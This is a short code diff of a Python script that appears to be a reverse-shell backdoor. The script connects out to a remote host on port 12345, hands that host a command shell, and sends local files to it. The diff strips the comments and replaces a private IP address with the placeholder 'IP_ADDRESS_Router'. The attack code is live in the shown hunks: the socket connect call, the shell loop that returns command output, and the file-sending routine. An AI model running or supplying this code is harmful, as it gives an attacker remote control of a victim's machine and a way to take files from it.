@@ -6,7 +6,7 @@ import tqdm
 import os
 
 SEPARATOR = "<SEPARATOR>"
-BUFFER_SIZE = 4096 # send 4096 bytes each time step
+BUFFER_SIZE = 4096 
 
 def send_file(adds):
     print("Downloading from this path: "+adds)
@@ -17,15 +17,11 @@ def send_file(adds):
     # progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
     with open(filename, "rb") as f:
         while True:
-            # read the bytes from the file
+            
             bytes_read = f.read(BUFFER_SIZE)
             if not bytes_read:
-                # file transmitting is done
                 break
-            # we use sendall to assure transimission in 
-            # busy networks
             sock.sendall(bytes_read)
-            # update the progress bar
             # progress.update(len(bytes_read))
             print("File sent")
         sock.close()
@@ -62,7 +58,7 @@ def shell(sock):
             sock.send(result)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("192.168.103.167", 12345))
+sock.connect(("IP_ADDRESS_Router", 12345))
 
 simply_sock()
 shell(sock)
